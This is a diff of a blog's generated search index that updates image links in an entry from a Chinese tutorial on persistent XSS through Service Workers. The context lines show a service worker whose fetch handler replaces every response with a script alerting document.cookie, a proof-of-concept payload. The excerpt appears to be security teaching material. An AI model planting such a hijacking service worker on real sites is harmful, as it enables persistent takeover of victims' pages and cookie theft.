@@ -5661,7 +5661,7 @@
   <entry>
     <title>持久化XSS漏洞利用</title>
     <url>/2021/02/04/%E6%8C%81%E4%B9%85%E5%8C%96XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>/img/x.jpg</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkryl0ylej30u0190dlh.jpg" alt="WechatIMG350"></p>
 <a id="more"></a>
 
 
@@ -5683,15 +5683,15 @@
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//监控install事件</span></span><br><span class="line">self.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"install"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 当serviceWorker注册之后，会首先安装一下。再次加载时，如果serviceWorker有更新，则会重新下载安装serviceWorker，否则不会安装。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//监控activate事件</span></span><br><span class="line">self.addEventListener(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"activate"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//监控fetch事件</span></span><br><span class="line">self.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    event.respondWith(<span class="keyword">new</span> Response(<span class="string">'&lt;script&gt;alert(document.cookie)&lt;/script&gt;'</span>, &#123;<span class="attr">headers</span>: &#123;<span class="string">'Content-Type'</span>: <span class="string">"text/html"</span>&#125;&#125;))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 
 <p>注册成功</p>
-<p>![image-20210222010617968](../../../Library/Application Support/typora-user-images/image-20210222010617968.png)</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkryjdynhj314m0pyjte.jpg" alt="image-20210222010617968"></p>
 <blockquote>
 <p>chrome://serviceworker-internals/?devtools   //查看是否注册成功</p>
 </blockquote>
-<p>![image-20210222011237971](../../../Library/Application Support/typora-user-images/image-20210222011237971.png)</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkryltocxj31120ko421.jpg" alt="image-20210222011237971"></p>
 <blockquote>
 <p>chrome://inspect/#service-workers </p>
 </blockquote>
-<p>![image-20210222011157073](../../../Library/Application Support/typora-user-images/image-20210222011157073.png)</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grkrykgafdj31360fo0uc.jpg" alt="image-20210222011157073"></p>
 <p>以上几种均可查看Service Worker是否注册成功</p>
 <h3 id="Service-Worker-XSS-利用"><a href="#Service-Worker-XSS-利用" class="headerlink" title="Service Worker XSS 利用"></a>Service Worker XSS 利用</h3>]]></content>
   </entry>
